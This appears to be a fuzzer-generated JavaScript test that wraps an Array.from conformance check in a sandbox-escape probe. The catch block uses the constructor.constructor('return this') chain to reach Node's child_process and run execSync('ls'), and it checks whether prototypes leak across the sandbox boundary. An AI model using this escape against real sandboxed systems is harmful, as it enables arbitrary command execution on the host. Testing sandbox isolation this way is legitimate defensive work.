try {
    var array = [
        127,
        4,
        8,
        16,
        32,
        64,
        128
    ];
    var arrayIndex = -1;
    function mapFn(value, index) {
        arrayIndex++;
        if (index + 1 < array.length) {
            array[index + 1] = 127;
        }
        assert.sameValue(value, 127, 'Value mismatch in mapFn at index ' + index + '.');
        assert.sameValue(index, arrayIndex, 'Index mismatch in mapFn.');
        return value;
    }
    var a = Array.from(array, mapFn);
    assert.sameValue(a.length, array.length, 'Length mismatch.');
    for (var j = 0; j < a.length; j++) {
        assert.sameValue(a[j], 127, 'Element mismatch for mapped array.');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}